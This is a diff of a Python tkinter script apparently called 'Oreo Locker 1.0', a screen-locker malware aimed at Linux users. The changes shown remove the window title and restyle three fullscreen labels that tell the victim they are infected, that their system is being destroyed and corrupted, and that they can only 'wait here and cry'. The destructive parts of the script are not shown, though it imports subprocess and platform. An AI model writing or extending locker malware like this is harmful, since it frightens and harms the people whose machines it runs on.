@@ -1,8 +1,10 @@
 import tkinter as tk
 import os
-from os import path
 import platform
 import subprocess as sp
+
+from os import path
+
 
 class Utils:
 
@@ -31,10 +33,9 @@ def MainThread():
     root = tk.Tk()
     UT = Utils()
 
-    root.title("Oreo Locker 1.0")
-    tk.Label(root, text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
-    tk.Label(root, text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
-    tk.Label(root, text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
+    tk.Label(root, font=("Cascadia Code", 20), text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
+    tk.Label(root, font=("Cascadia Code", 15), text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
+    tk.Label(root, font = ("Cascadia Code", 10), text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
 
     root.geometry("1920x1080")
     root.resizable(False,False)
